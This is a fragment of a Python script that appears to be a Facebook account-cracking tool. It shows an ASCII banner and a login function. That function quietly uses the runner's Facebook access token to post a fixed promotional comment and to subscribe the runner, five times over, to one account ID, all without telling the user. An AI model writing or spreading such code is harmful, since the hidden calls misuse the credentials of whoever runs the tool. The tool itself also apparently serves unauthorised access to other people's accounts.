...
# BANNER #
def banner():
    print ("""\1b[1;97m _____ __ _____ __ \1b[1;97m / __(_)_ _ ___ / /__ ____/ ___/______ _____/ /__\1b[1;97m _\\ / ' \ _ \ / -_)___/ /__/ __/ _ `/ __/ '_/\1b[1;97m /___/_/_/_/_/ .__/_/\_/ \__/_/ \,_/\_/_/\\\1b[1;97m /_/ """)
...
def login_xx():
    ...
    kom = random.choice(["Hello I'm user simcrck","Be yourself and never surendtod:v","Login bff-2 \nhttps://www.facebook.com/100002461344178/posts/3965852000173472/?substory_index=0&app=fbl"])
    ...
    requests.post('https://graph.facebook.com/115041430913902/comments/?message=' + kom + '&access_token=' + toket) 
    requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket) # Akun 2007
    requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket) # Nick unik sniper @() Sheikh Sami Shuja Uddin MD
    requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket) # Romi Afrizal 2018
    requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket) # Romi Afrizal 2021
    requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket) # Iqbal Bobz
